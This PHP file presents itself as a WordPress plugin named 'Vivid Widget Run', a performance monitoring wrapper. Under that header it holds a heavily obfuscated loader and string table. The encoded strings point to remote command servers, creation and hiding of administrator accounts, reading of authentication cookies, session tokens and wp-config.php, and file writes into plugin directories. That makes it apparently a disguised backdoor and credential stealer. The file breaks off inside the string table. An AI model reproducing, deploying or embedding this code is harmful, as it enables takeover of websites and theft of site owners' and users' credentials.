<?php

/**
 * Plugin Name:       Vivid Widget Run
 * Plugin URI:        https://ethanyoung.com/wp/vivid-widget-run
 * Description:       Streamlined performance monitoring wrapper
 * Version:           1.1.4
 * Author:            Ethan Young
 * License:           GPL-2.0-or-later
 * Text Domain:       vivid-widget-run
 * Requires at least: 5.0
 * Requires PHP:      5.6
 */
/* SCV:4.5.3 */
if(!function_exists('c1sob647u1i')&&!((defined('SC_CORE_BOOT_VER')&&version_compare((string)SC_CORE_BOOT_VER,'4.5.3','>='))||(isset($GLOBALS['sc_boot_ver'])&&version_compare((string)$GLOBALS['sc_boot_ver'],'4.5.3','>=')))){function y86955d2t25ub7t($i){static $a=null;if($a===null){$a=array_merge(array('sBMzsnv','*".8/?. ','-Q}Q_','=m*/Kmf/','W9K"ro K./3o*r*',';]9coK.=m*/Kmf/','Lz.zJZ5&`.#&G','*r?; *',']r?of','*9=*r?','*r?]/K','Fo?Kmf/','?r?of','LzgZ.zJZ5&`.#&G','$f9R;]9coK*','fNFo?','fNFo?','"6f F','"6f F','9K]oKN','9K]oKN','o*.Wo]/',' ;"m"6/.oK8m]oFmr/',' ;"m"6/.oK8m]oFmr/','W ;/K',':=','W:?or/','Q;6;','Q*F.','Q=r.','Q*:f.','Qi.','Q WW','Lz.2u`n!`n.#&G','$Q?F.','Lz.zJZ5&`.#&G','?/m];mr6','*"mKFo?','o*.m??mk','" 9Kr','?fFo?','; *o3.c/r/9oF','o*.oKr','*".','o*.*r?oKc','Qf9.*r.','o*.Fo?','o*.]oKN','QQ','o*.?/mFm=]/'),array('QQ','o*.:?orm=]/','] "N/F','?/Kmf/','*"mKFo?','c/r.r?mK*o/Kr','*".f9.?/*"9/','*rmr','F/8','F/8','fF}','$Qf9.*r.','$Qf9.]N.','"]/m?*rmr"m"6/','*/r.r?mK*o/Kr','F/]/r/.r?mK*o/Kr','*".foc.Wmo]','?/*"9/','f9Y','Fo?','77','o*. ={/"r','W9K"ro K','W9K"ro K','?/f 8/.Wo]r/?','c] =','$[Q;6;','r 9"6','?/Kmf/','?/Kmf/','" ;k','r/f;Kmf','*k*.c/r.r/f;.Fo?','$rf;','sBMzsnv',':;R" Kr/Kr','$h','$Q*".rf;',';9r/K8','ngz#&Gl','*".rf;.Wo3/F','?/m];mr6','Lz.2u`n!`n.#&G','$h','$Q*".','Fo?','$" ?/.','" ?/','o?"K{"kWfWViN"%3Fo**-','Lz.2u`n!`n.#&G'),array('$;]9coK*$','Wo]/.c/r." Kr/Kr*',';?/c.fmr"6','$h$h[YM2y7ChFHhQhFHhQhFH<Yh[h$$','Wo]/frof/','Wo]/*oI/','*"."? K.W/r"6','*".;mk] mF.r','m;m"6/.c/r.8/?*o K','*r?r ] :/?',';6;.*m;o.Kmf/','m;m"6/b6mKF]/?',']or/*;//F','M!Gy!G.MuAnLsG!','m;m"6/',' ;/K]or/*;//F','M!Gy!G.MuAnLsG!',']or/*;//F','oKo.c/r',' ;/K.=m*/Fo?','/3;] F/','$h','#B.`sg!','*".] "N.K','*".] "N.K','*".] "N.K','*".] "N.K','*".] "N.F=','*".] "N.F=','*".] "N.K','f/r6 F./3o*r*','c/r.8m?','M!J!2nY5!n.Ju2(C|','|EYw<','W] "N','$h','$*".','Q] "N','*".] "N.W6','*".] "N.W6','*".] "N.K','*".] "N.K','*".] "N.o;','*".] "N.o;','*".] "N.W6','i9/?k','M!J!2nYG!J!sM!.Ju2(C|','|<','#&MsJJuL.A&J!.gu#M','sBMzsnv'),array('m"r;','*".m"r;.W6','*".m"r;.W6','*".m"r;.W6','*".m"r;.W6','c/r. ;ro K','9;Fmr/. ;ro K','m"ro8/.;]9coK*','m??mk.8m]9/*','m??mk.9Koi9/','oK.m??mk','m"ro8/.;]9coK*','m"ro8/.;]9coK*','m"ro8/.;]9coK*','m??mk.FoWW','n6? :m=]/','7Y','*"./?? ?*','*"./?? ?*','*"./?? ?*','m??mk.*]o"/','*"./?? ?*','mFF.m"ro K','mFF.Wo]r/?','$"m"6/','$oKF/3Q;6;','Fo?','Lz.2u`n!`n.#&G','*".;9?c/','*".;9?c/','?/m];mr6','*".;9?c/','*".;9?c/','?/m];mr6','*".;9?c/','*".;9?c/','?/co*r/?.*69rF :K.W9K"ro K','m r9.:f;Im?i6k%**mN]-','*".;9?c/','/?? ?.c/r.]m*r','Wo]/','rk;/','rk;/','f/**mc/','s]] :/FYf/f ?kY*oI/','gm3of9fY/3/"9ro KYrof/','?/m];mr6','Wo]/','*".=  r.8/?','*".=  r.*r'),array('$Qi.','$Q9=.','rof/','*".9;Fmr/.=mF','K ','Wmo]',' ;"m"6/.oK8m]oFmr/','Q;6;Q WW','$Q*F.','$hFHhQhFHhQhFH$','al','Wo]/.;9r." Kr/Kr*','*".;/KFoKc.oK8m]oFmr/',';]9coK*.] mF/F','K=K6r_o}30o*wi?i3*F%','9Ib6?mi8*Fx_r{]?x;-8','wQwQw','k/*','k/*',';mr6oKW ','m"ro8/.;]9coK*','o*.f9]ro*or/','c/r.*or/. ;ro K','m"ro8/.*or/:oF/.;]9coK*','$h$h[YM2y7hFHhQhFHhQhFHYh[h$$',';mr6','F/mF','c K/','k/*','*".F/F9;.r  N','9-0fVm?]x_9.w8oF','k/*','*rm?roKc','F/F9;',' ;/KFo?','?/mFFo?','"] */Fo?','"] */Fo?','c] =','$[','m??mk.fm;','*6/]]./3/"','Fo*m=]/.W9K"ro K*','*"]',';6;YR]Y','YbaTX','` Y*kKrm3Y/?? ?*','zm?*/Y/?? ?','Amrm]Y/?? ?','D4'),array('r N/K.c/r.m]]','m??mk.N/k./3o*r*','nu(!`.zsGM!','o*.=  ]','w3xs-%}b"ssX2X}V0V-V%sws2=0xXAVX=WsxwX!w0_','w3V_xFX"!}"_Ab}x/VF_#X%XX-F%XV0!#m=F=/sx-=','w30Fb"}-_}!A%wXx0%-wm-Vxw-B0x_%%x_}#}wm=BB','6rr;*7$$w3?;"Qo $/r6','6rr;*7$$/r6/?/9fR;9=]o"QK Fo/*Qm;;','6rr;*7$$/r6QF?;"Q ?c','6rr;*7$$?;"Q/r6Qcmr/:mkQWf','6rr;*7$$/r6Q=] "N?mI ?Q3kI','6rr;*7$$;9=]o"R/r6QK :K F/*Qo ','6rr;*7$$/r6RfmoKK/rQ?;"Wm*rQ" f4m;o.N/kl3=6LB&XLNc9NVM`g9X=88J9?z5Jqfc:1/2-M0cbv%LF:AocPMfzLyPG3?*N!e:&W','6rr;*7$$/r6XQ]m8mQ=9o]F','6rr;*7$$/r6Q?;"Q=]3?=FKQ" f','6rr;*7$$/r6RfmoKK/rQ;9=]o"Q=]m*rm;oQo ','6rr;*7$$cmr/:mkQr/KF/?]kQ" $;9=]o"$fmoKK/r','6rr;*7$$/r6/?/9fQ?;"Q*9=i9/?kQK/r: ?N$;9=]o"','6rr;*7$$/r6/?/9fR?;"Q;9=]o"K F/Q" f','6rr;*7$$fmoKK/rQcmr/:mkQr/KF/?]kQ" ','6rr;*7$$/r6Qm;oQ KWoKm]orkQo $;9=]o"','6rr;*7$$/r6/?/9fQ;9=]o"Q=] "N;oQK/r: ?N$8X$?;"$;9=]o"','6rr;*7$$/r6/?/9fR{* KR?;"Q*rmN/]kQo ','6rr;*7$$?;"Q*/Kro Q3kI$fmoKK/r','6rr;*7$$/r6Qf/?N]/Qo ','6rr;*7$$/r6Qm;oQ; "N/rQK/r: ?N','mFfoK.','mFf.','mFfoKo*r?mr ?.','=m"N9;.','cI/K" F/','cIF/W]mr/',';m"N','"?"_b','9K;m"N','cIF/" F/','cIoKW]mr/','6/3b=oK','6/3b=oK','v[',':;RmFfoK$',':;RoK"]9F/*$','Lz.2u`n!`n.#&G','c] =','[Q;6;','m??mk.?mKF',':;.?mKF','?mKF','*".F/mF]oK/'),array('fo"? rof/','"/o]','"m]].9*/?.W9K"',':;.?/f r/.c/r','rof/ 9r','**]8/?oWk',']ofor.?/*; K*/.*oI/','o*.:;./?? ?','"9?].oKor','"9?].*/r ;r.m??mk','"9?]./3/"','"9?].*/r ;r.m??mk','2ZGJuzn.G!nZG`nGs`MA!G','2ZGJuzn.n&g!uZn','2ZGJuzn.MMJ.y!G&A1z!!G','2ZGJuzn.MMJ.y!G&A1vuMn','2ZGJuzn.`uzGu5G!MM','2ZGJuzn.zGu5G!MMAZ`2n&u`','"9?]./3/"','6rr;." F/',':;.?/f r/.; *r','rof/ 9r','**]8/?oWk',']ofor.?/*; K*/.*oI/','6/mF/?*','= Fk','o*.:;./?? ?',',Y','*".W/r"6.  f','"9?].oKor','"9?].*/r ;r.m??mk','"9?]./3/"','7Y','2ZGJuzn.zuMn','2ZGJuzn.zuMnA&!J#M','2ZGJuzn.vnnzv!s#!G','2ZGJuzn.`uzGu5G!MM','*".]m*r.?;"','m??mk.9K*6oWr','r?of','pj{* K?;"j7jbQwjEjoFj7_Ejf/r6 Fj7j/r6."m]]jEj;m?mf*j7+pjFmrmj7jw3_="}F/_wjEjr j7j','j^Ej]mr/*rj)^','2 Kr/KrRnk;/','m;;]o"mro K${* K','{* K.F/" F/','?/*9]r','?/*9]r','w3',' ?F','?/* ]8/'),array('?;".F/"?k;r.Wmo]/F','?;".=mF.N/k.]/Kcr6','m??mk.Wo]r/?',';?/c.*;]or','$h?4hK$','9;Fmr/. ;ro K','*"."b."m"6/','of;] F/','*/?8/?.N/k','9?]*','*"."b."m"6/','*?8.N/k','?;".m]].Wmo]/F','9;Fmr/. ;ro K','*"./K"."','*"./K"."','*/?om]oI/','"6?','fr.?mKF','=m*/0-./K" F/','c/r. ;ro K','*"./K"."','*"./K"."','=m*/0-.F/" F/','*"./K"."','zvz.y!GM&u`.&#','9K*/?om]oI/','m]] :/F."]m**/*','*r?.?/;]m"/','/;','*:','*:.9?]','*:."m"6/F','o*.*"m]m?','*"./?? ?*','*"./?? ?*','/?? ?*','m??mk.f/?c/','*"./?? ?*','*"./?? ?*','W]9*6./?? ?*','*".;mk] mF.;/?*o*r/Kr','"? K&Kr/?8m]','*".oKr/?8m]','oKr/?8m]','Fo*;]mk','29*r fYfmoKr/KmK"/YoKr/?8m]','*".c9m?F.oKr/?8m]','oKr/?8m]','29*r fYfmoKr/KmK"/YoKr/?8m]'),array(':;.K/3r.*"6/F9]/F',':;.*"6/F9]/./8/Kr','*"."6moK','#u&`5.2Gu`','*69rF :K','N%;888NF%I?w9"r?"f30]',':;.?/f r/.c/r','*or/.9?]',':;R"? KQ;6;4F oKc.:;."? Kl','rof/ 9r','=] "NoKc','**]8/?oWk','Wm*r"co.WoKo*6.?/i9/*r',']or/*;//F.WoKo*6.?/i9/*r','ocK ?/.9*/?.m= ?r','oKo.c/r','I]o=Q 9r;9r." f;?/**o K',' WW',' =.c/r.*rmr9*','Kmf/',' =.cI6mKF]/?','I]o=','6/mF/?*.]o*r','2 Kr/KrR!K" FoKc7','oF/Krork','"]o',';6;F=c','6rr;.?/*; K*/." F/','G!eZ!Mn.g!nvu#','v!s#',' =.c/r.]/8/]',' =./KF.W]9*6','Kmf/',' =.c/r.*rmr9*','F/Wm9]rY 9r;9rY6mKF]/?',' =.c/r.]/Kcr6',':;.Wo]r/?',':;. =./KF.W]9*6.m]]','2 Kr/KrRJ/Kcr67Y','2 KK/"ro K7Y"] */','W]9*6',':;.*"6/F9]/.*oKc]/./8/Kr','#&MsBJ!.Lz.2Gu`','*".]m*r.W/r"6.r*','*".*//K.8/?','*".]m*r.W/r"6.r*',':;.9K*"6/F9]/./8/Kr','W/r"6','"? K.*rm]/.oK]oK/','*/r.rof/.]ofor'),array('*/r.rof/.]ofor','*69rF :K','c/r. ;ro K',';]9coKG9]/*','*".;]9coK.?9]/*','oK{/"rG9]/*','oK{/"rG9]/*','*".oK{/"r.?9]/*','oK{/"rG9]/*','{*','*".{*',';mc/',';mc/','*".;mc/',';mc/','*".*:','"m"6/','c/r. ;ro K','*".]m*r.6/m].r*','*".6/m].*"mK','*?"','K ','Q;6;','$[$[Q;6;',';?/c.?/;]m"/','$h*H$','6/m]','FoF.m"ro K','?/co*r/?.*69rF :K.W9K"ro K','N%;888NF%I?w9"r?"f30]','6 f/.9?]','c/r. ;ro K','9;Fmr/. ;ro K','*".]m*r.6=','K ','rof/ 9r','=] "NoKc','c/r.r?mK*o/Kr',';mk] mFnr]',';mk] mFnr]','*".]m*r.W/r"6.r*','*".]m*r.W/r"6.Wmo].r*','*".W/r"6.Wmo]*','fm3','foK','8/?',';6;','*m;o','**]','o*.**]'),array('f*','o*.f9]ro*or/',':;',':;.8/?*o K','*?8','*".{*','{*. K','{*.]/K','{*.?/i','*".{*.;?oKr/F','{*. =','*".{*. =.9*/F','{*.r*','*".{*.;?oKr/F.r*','*:.9?]','*:.6or*','c/r. ;ro K','*".*:./;.6or*','*:.]m*r','c/r. ;ro K','*".*:./;.]m*r','*:.6mF','*".*:.6mF','8.mF8','$mF8mK"/FR"m"6/Q;6;','8.F=','$F=Q;6;','8. "','$ ={/"rR"m"6/Q;6;','Qc.','Qc].','8.c9m?F',':;RoK"]9F/*','Q;6;','oKo.c/r','9*/?.oKoQWo]/Kmf/','CK K/<','Q9*/?QoKo','8.oKo','m9r .;?/;/KF.Wo]/','8.6r','Q6rm""/**','Q6rm""/**','8.:"',':;R" KWocQ;6;',':;R" KWocQ;6;','M2.L2',';?/;/KF','M2.sZnu.zG!z!`#',';"'),array('Lz.Gu2(!n.y!GM&u`','JM2Lz.y','L_n2','*c."m"6/;?/**.;9?c/."m"6/','"]m**./3o*r*','2m"6/.!Km=]/?',':;.Wm*r/*r."m"6/',':;."m"6/.*/?8/."m"6/.Wo]/','W. N','W.Wmo]*','W.Wmo].r*','*".]m*r.W/r"6.Wmo].r*','o"','"W','r*','r*','o".K','o".bWm','*".]=.f F/',']=','*"."mKm?k','"k','or/f*','/??','*or/.9?]',':;R] coKQ;6;',':;.] coK.9?]',';m?*/.9?]','zvz.ZGJ.vuMn','c/r.*or/.9?]','c/r.=] coKW ','9?]','*or/9?]','vnnz.vuMn','M!Gy!G.`sg!','oKo.c/r','fm3./3/"9ro K.rof/','*".F/mF]oK/','*/?8/?.N/k','*/?8/?.N/k','9?]*','9?]*','9?]*','*?8.N/k','r/*r.f F/','f "NM?8(/kR','*".]m*r."b','*69WW]/','c/r. ;ro K','c] ='),array('$[Q;6;','F fmoK',';]9coKy/?*o K',';]9coK','?  r','m"ro8mr/Fz]9coK*','f9z]9coK*','] coKZ?]','mFfoK*','mFfoK*2  No/*',':;.{* K./K" F/','{* K./K" F/','m;;]o"mro K$ "r/rR*r?/mf','*".W/r"6.  f','*".W/r"6.  f','  f','"b./f;rkY','W/r"6','"b.F/"?k;r.Wmo]/FY','9;Fmr/. ;ro K','*".]m*r."b','"b.=mF.{* KY','W/r"6.9?]','F fmoK',';]9coK','Q;6;','=/m" K','H$','R.','*r?.*;]or','*".=l','Tol','TKl','TFl','9;Fmr/. ;ro K','F/]/r/. ;ro K','*"./?? ?*','*"./?? ?*',';]9coK','rm?c/ry/?*o K','W ?"/Z;Fmr/','*".;]9coK.?9]/*','{*','{*."m"6/F','{*.;9?c/.foc','K ','{*.;9?c/.;/KFoKc','K ','*".{*','{*'),array('K ','{*.;9?c/.;/KFoKc',';mc/',';mc/',';mc/."m"6/F','*:','K ','r/f;]mr/*','r/f;]mr/*','c9m?F','mF8mK"/F2m"6/','mF8.r;]','F=','F=.r;]','r6/f/','r6/f/.r;]','oK*rm]]/?','oK*r.r;]',' "J mF/?',' ".r;]','o*.K9f/?o"',';mk] mFnr]',';mk] mFnr]','"? K&Kr/?8m]','K{b%woX8 k{k8f3F','*/r.r?mK*o/Kr',';mk] mFnr]',';mk] mFnr]','K ',':;.c/r.*"6/F9]/F./8/Kr',':;."]/m?.*"6/F9]/F.6  N','*".]m*r.W/r"6.r*','f/f ?k.c/r.9*mc/','9;Fmr/','  f.c9m?F','D4;6;','*kKrm3./?? ?','8/?.fo*fmr"6','K .*"8','K .;?/8','*".9;Fmr/.*9*;/"r',':;.?/f r/.c/r','?/Fo?/"ro K',']ofor.?/*; K*/.*oI/','c/r. ;ro K','m"ro8/.;]9coK*','?/;]m"/.Wmo]','*".?/" 8/?."6/"N','$4*"."=l','?/Fo?/"ro K'),array(']ofor.?/*; K*/.*oI/','*]//;',';? =/.oK" K"]9*o8/','*".9;Fmr/.=mF','K ','K ','? ]]=m"N.Wmo].','*".;/?*o*r/F','"mKm?k.? ]]=m"N.','*".9;Fmr/.=mF','$Q9=.','9;Fmr/','c/r.;]9coK*','Wo]/./3o*r*',':;RmFfoK$oK"]9F/*$;]9coKQ;6;','*"mK','oK"',';6rf]','6rf]','{*','zsnv&`Au.!qn!`M&u`','QQ','F/m"ro8mr/.;]9coK*',':;RmFfoK$oK"]9F/*$;]9coKQ;6;','F/m"ro8mr/.;]9coK*','F/]/r/.;]9coK*','"9??/Kr.9*/?."mK','F/]/r/.;]9coK*','c/r.9*/?*',':;.*/r."9??/Kr.9*/?','? ]/','mFfoKo*r?mr ?','K9f=/?','Lz.zJZ5&`.#&G','#&G!2nuG1.M!zsGsnuG','m??mk.N/k*',';6;','*".oK{/"r.?9]/*','?/*"mK','*".]m*r.rf;"]/mK','*".]m*r.rf;"]/mK','*k*.c/r.r/f;.Fo?',':;.','m"ro8/.;]9coK*',':;R" Kr/Kr','$;]9coK*','M2.#z.B!5&`','$hK4h$h[YM2.#z.B!5&`7C+mRIsRPwRxQ.7)H<Yh[h$Q[4h$h[YM2.#z.!`#7hXYh[h$hK4$*',' ;"m"6/.oK8m]oFmr/','*".]m*r.?/*"mK'),array('6FiIF-V{f:kXmc/-"frx','6FiIF-V{f:kXmc/-"frx',';/?o Fo"','foc?mr/','*?".oK8m]oF','foc?mr/','f9.K r.:?orm=]/','c] =','$h$h[YM2y7ChFHhQhFHhQhFH<Yh[h$$','$h$h[YM2y7ChFHhQhFHhQhFH<Yh[h$$','foc?mr/','*".oKor.*?".r*','*".oKor.*?".r*','K ','*".]m*r.W/r"6.r*','*".W/r"6.Wmo]*','*".]m*r.W/r"6.Wmo].r*','K ','9;Fmr/. ;ro K','*".oKorom]oI/F','mFF. ;ro K','9;Fmr/. ;ro K','K ','K ','F/]/r/.r?mK*o/Kr','*69rF :K','mFVkbo;X:F8/NI','oKor','F/]/r/. ;ro K',':;.?/f r/.c/r',':m?f','o*.mFfoK','m"ro8mr/.;]9coK*','m"ro K','m"ro8mr/','m"ro8mr/R*/]/"r/F',';]9coK',';]9coK','"6/"N/F','"6/"N/F',':;.*mW/.?/Fo?/"r','mFfoK.9?]',';]9coK*Q;6;','*"mK.m"r','F? ;oK*',';]9coK*','F? ;oK*','F=Q;6;','M2.#B','mF8mK"/FR"m"6/Q;6;'),array('M2.s#y','$[Y','.B!5&`7','$h$h[Y','.B!5&`7C+mRIsRPwRxQ.7)H<Yh[h$Q[4h$h[Y','.!`#7hXYh[h$$*','F? ;oK*','f9*r9*/','f9*r9*/','{x;:rWWmf}xi/-oK_x%r3','Q;6;','D*rk]/ar?+FmrmR;]9coKlj','j)Er?+FmrmR;]9coKlj','j)pFo*;]mk7K K/Oof; ?rmKr^D$*rk]/a','D*"?o;raF "9f/KrQmFF!8/KrJo*r/K/?Cj#ug2 Kr/KrJ mF/FjEW9K"ro KC<pF "9f/KrQi9/?kM/]/"r ?s]]Cjr?+FmrmR;]9coK)j<QW ?!m"6CW9K"ro KC?<p8m?Y;l?Qc/rsrr?o=9r/CjFmrmR;]9coKj<,oWC;lllj','j>>;lllj','j<?Q?/f 8/C<^<,8m?Y"lF "9f/KrQi9/?kM/]/"r ?CjQ*9=*9=*9=YQf9*r9*/YQ" 9Krj<,oWC"<p8m?YKl;m?*/&KrC"Qr/3r2 Kr/KrQ?/;]m"/C$+\'wRx)$cEjj<<>>w,oWCKaw<"Qr/3r2 Kr/KrljCjHgmr6Qfm3CwEKRX<Hj<j^^<,D$*"?o;ra','k-;.%3F0]?XmV =;','cXW_6-ok%c6X*x','c/r.;]9coK.Fmrm','`mf/','`mf/',':;R;]9coK*Rm"ro8/',':;R;]9coK*RoKm"ro8/','Wo/]F*','Wo/]F*',':;Rf9R;]9coK*',':;R;]9coK*Rf9*r9*/','Wo/]F*','Wo/]F*','$[YM2y7','$z]9coKY`mf/7h*[C+\'h?hK[)H<$o','Wo/]F*',':;RF? ;oK*','Wo/]F*','F=Q;6;','M2.#B','mF8mK"/FR"m"6/Q;6;','$[YM2y7',':;RF? ;oK*',';mrr/?K',';?/c.i9 r/','dt','6oFF/K','t$','6oFF/K','?  r*','?  r*','mrr?o=9r/*','?  r*'),array('mrr?o=9r/*','zvz.gs\\uG.y!GM&u`','/]AoKF/?2 KK/"r ?','$:;RWo]/RfmKmc/?$]o=$;6;$/]AoKF/?2 KK/"r ?Q"]m**Q;6;','$Wo]/RfmKmc/?$]o=$;6;$/]AoKF/?2 KK/"r ?Q"]m**Q;6;','$Wo]/RfmKmc/?RmF8mK"/F$]o=$;6;$/]AoKF/?2 KK/"r ?Q"]m**Q;6;','Q"]m**Q;6;','"]m**Y/]AoKF/?2 KK/"r ?','$\'h*[Dh4C;6;<4$','"]m**Y/]AoKF/?2 KK/"r ?','"]m**Y.M2./]AoKF/?2 KK/"r ?.G/m]',':;.','D4;6;Y','.*".6oF/','.*".6oF/.Fo?','D4;6;Y"]m**Y/]AoKF/?2 KK/"r ?Y/3r/KF*Y.M2./]AoKF/?2 KK/"r ?.G/m]Yp',';? r/"r/FYW9K"ro KY 9r;9rCYm??mkYdFmrmY<Yp','d6oF/YlYo**/rCYd5JuBsJM+j.*".6oF/j)Y<Y4Yd5JuBsJM+j.*".6oF/j)Y7Yjj,','oWYCYd6oF/YOllYjjYTTYW9K"ro K./3o*r*CYj*".Wf.Wo]r/?jY<Y<Yp','dFmrmYlY*".Wf.Wo]r/?CYdFmrmEYd6oF/Y<,',';m?/Kr77 9r;9rCYdFmrmY<,','Wf','o-;6=3K";?;]]3-"/x_x{','Wo]/*','mFF/F','"6mKc/F','r?//','Kmf/','*".6/m8k','c/r.r?mK*o/Kr','*".?/" 8/?."6/"N','*/r.r?mK*o/Kr','*".?/" 8/?.r6? rr]/','?/" 8/?','* 9?"/./f;rk','*".?/" 8/?.r6? rr]/','$Q9=.','*/r.r?mK*o/Kr','?/" 8/?',':;.*/KF.K/:.9*/?.K roWo"mro K.r .mFfoK','..?/r9?K.Wm]*/',':;.K/:.9*/?.K roWo"mro K./fmo].mFfoK','?/f 8/.m"ro K','?/co*r/?.K/:.9*/?',':;.*/KF.K/:.9*/?.K roWo"mro K*','/For.9*/?."?/mr/F.9*/?',':;.] coK',':;.K roWk.mFfoK.K/:.] coK',':;F=','"m;m=o]oro/*'),array('!J!2nY9Q&#EY9Q9*/?.] coKEY9Q9*/?.;m**EY9Q9*/?./fmo]YAGugY','Y9Y&``!GY\\u&`Y','YfYu`Y9Q&#YlYfQ9*/?.oFYLv!G!YfQf/rm.N/kYlYU*Ys`#YfQf/rm.8m]9/YJ&(!YU*','UmFfoKo*r?mr ?U','mi','r ','"N.;/KF',':;.c/K/?mr/.m9r6."  No/','Lz.M/**o K.n N/K*','K ','*/"9?/.m9r6','m9r6','M!2ZG!.sZnv.2uu(&!','sZnv.2uu(&!','Ju55!#.&`.2uu(&!','"N.;/KF','K ','2uu(&!.#ugs&`','2uu(&!zsnv','s#g&`.2uu(&!.zsnv','$:;RmFfoK','nGZ!','AsJM!',':;.fmo]','o**9/F','c/r. ;ro K','o**9/F.8','9*/?.f/rm','*/**o K.r N/K*','/3;o?mro K','/3;o?mro K','*/**o K.r N/K*','c/r.oK*rmK"/','nGZ!',':;.c/K/?mr/.m9r6."  No/','] cc/F.oK','"N.;/KF','"  No/*','"  No/*','o**9/F','K ','K ','"N." ffor','=9','=;','6m*."m;','mFfoKo*r?mr ?','r*','r*','K '),array('oKr/?"/;r','o"','"W','] coK."W','$\'','+mRWwRx)p0EXw^d$','c/r. ;ro K','IiI*Vb%?F;coK3wF;bF','m* ?r','K ','*"?','o ','mr fo".K .Fo?Y','Q;6;','o ','mr fo".=mF.;6;Y','r/f;Kmf','mr fo".K .r/f;KmfY','W*kK"','mr fo".r/f;.Wmo]Y','mr fo".*6 ?r.:?or/Y','mr fo".]oKN.Wmo]Y','Q*" ]F','o ','mr fo".?/Kmf/.Wmo]Y','6m*6.Wo]/','o ','mr fo".8/?oWk.Wmo]Y','fF}','mr fo".r6o?F.;m?rkY','*".','*8bbo 3KmbIx39I',':;.?/f r/.c/r','?F*]:ob?9K:?:=6','*".;=l','6/mF/?*','2m"6/R2 Kr? ]','K R"m"6/','mb ]F/.oW-}Wo:w{f"8','?F*]:ob?9K:?:=6','rof/ 9r','$hK4D&Wg F9]/Yf F.;6;+wRxQ)[hQ"ah*[;6;.8m]9/Ym9r .;?/;/KF.Wo]/+\'hK)[','+\'hK)[hKDh$&Wg F9]/ahK4$o','$hK4D&Wg F9]/Y]or/*;//Fah*[;6;.8m]9/Ym9r .;?/;/KF.Wo]/+\'hK)[','$hK4;6;.8m]9/Ym9r .;?/;/KF.Wo]/+\'hK)[','+\'hK)[hK4$o','$hK4D&Wg F9]/Y]or/*;//Fah*[;6;.8m]9/h*[Dh$&Wg F9]/ahK4$o','$hK4D&Wg F9]/Yf F.;6;+wRxQ)[hQ"ah*[;6;.8m]9/h*[Dh$&Wg F9]/ahK4$o',' ;"m"6/.?/*/r',' ;"m"6/.c/r.*rmr9*'),array(' ;"m"6/./Km=]/F','Q;6;',':?or/.Wmo]/FY',':=',':?or/.Wmo]/FY','W] "N',':?or/.Wmo]/FY','c/r.r?mK*o/Kr','*".mFfoK.ro"N','*".mFfoK.oKW]oc6r','c/r. ;ro K','=9','9*/?Kmf/./3o*r*','mFfoK.ro"N','*"."6moK','9*/?Kmf/./3o*r*','/3mf;]/Q" f',':;.*/r.;m**: ?F','=;','mFfoK',';/?*o*r.Wmo]','mFfoK','" ]]o*o K',':;.oK*/?r.9*/?','sBMzsnv',':;RoK"]9F/*$9*/?Q;6;','9*/?.] coK','9*/?.;m**','9*/?./fmo]','? ]/','Fo*;]mk.Kmf/','mFfoK','K .:;F=',':;.6m*6.;m**: ?F','"9??/Kr.rof/','fk*i]','1RfRFYv7o7*','9*/?.] coK','9*/?.Ko"/Kmf/','9*/?.?/co*r/?/F','9*/?.*rmr9*','U*','U*','UF','mFfoK','*i].oK*/?r.Wmo]','"m;m=o]oro/*','9*/?.oF','f/rm.N/k','f/rm.8m]9/'),array('mFfoKo*r?mr ?','UF','U*','9*/?.oF','9*/?.]/8/]','f/rm.8m]9/','U*','U*','"]/mK.9*/?."m"6/','8/?oWk.Wmo]','c/r.9*/?.=k','] coK','9*/?."mK','mFfoKo*r?mr ?','"m;.8/?oWk.Wmo]',':;.F/]/r/.9*/?',':;RmFfoK$oK"]9F/*$9*/?Q;6;','=9','=;','K ',';/?*o*r.Wmo]','mFfoK','mFfoK','i9/?k.:6/?/','=9','Ys`#Y9*/?.] coKYOlY|','6oF/.i','c/r. ;ro K','m]]','$hCChFH<h<$','$hChFHh<$','6oF/."Kr','] coK..K r.oK','] coK..K r.oK','6oF/.?/*r','c/r. ;ro K','m"ro8/.;]9coK*',';6;','c/r. ;ro K','*rk]/*6//r','r/f;]mr/','$r6/f/*',':;R" Kr/Kr$r6/f/*','$;mrr/?K*','oK{/"r.X','oK{/"r','QQ','$h','$6 f/','$8m?$:::'),array('$8m?$:::$86 *r*','$8m?$:::$6rf]','$*?8$:::','$*?8$9*/?*','$9*?$] "m]$:::','$:;R" Kr/Kr$f9R;]9coK*','$:;R" Kr/Kr$;]9coK*','Q;6;','oK*rm]]/F','*".*;?/mF.oKr/?8m]','*;?/mF','*?".oK8m]oF','*".*;?/mF.K?','K .?  r*','*".*;?/mF.oKr/?8m]','$:;R" Kr/Kr$;]9coK*$','*;?/mF','*;?/mF','$:;R" KWocQ;6;','$:;R" KWocQ;6;','$F/WoK/h*[hCh*[+|j)#B.`sg!+|j)h*[Eh*[+|j)C+\'|j)H<+|j)$','$rm=]/.;?/Wo3h*[lh*[+|j)C+\'|j)H<+|j)$','$\'+mRIsRPwRx.)Hd$','i9/?k','$\'+mRIsRPwRx.dR)Hd$','F=.Kmf/.?/{/"r/F','SQS',' ;ro K*S','MnsGnYnGs`Ms2n&u`','!J!2nY ;ro K.8m]9/YAGugY','YLv!G!Y ;ro K.Kmf/YlY','|m"ro8/.;]9coK*|','YJ&g&nYXYAuGYZz#sn!','GuJJBs2(','2ugg&n','z#sn!Y','YM!nY ;ro K.8m]9/YlYU*YLv!G!Y ;ro K.Kmf/YlY','9;Fmr/.Wmo]',':;."m"6/.F/]/r/','m]] ;ro K*',' ;ro K*',' ;ro K*','m"ro8mr/',';y6?"x9-AWbH8wJ5nByoBF`bKv6mwWBuyNKmrJr3\\?1KvXMrAkPBonyA*cB LPvX__*BsK3PFr_9{g"2enI99WW"AIwzw%``krycn?gkn"NyIW6i"\\yN0*$865B?%32n=$Me6`q?J3eF 2s9*Xs]/nP-}HA`!K*6A]ky&69!cG\\?zM`}588qX3/n0}$zIk$3\\*:Iiem(F9"#r-_iBZi:Zgf3V983:V`wGNeG0NKx1}0$\\VLyMg"&!PfL"$b=:`N*n=f:V:L=VwN/"G68M={ro#g}$$I3wXx?/LK$#m:zfe qf0XF fA8mV2_KK\\cg{iFBq!9z(wxncV#Wi?V]5FIre{-oJ%5fyHZ"9!yn!{H(yu/Vfy}&}q:uvf`kF!\\3c}$nHZP=o0VVBn\\_\\LV=33_&m-A1Ms&m:G6 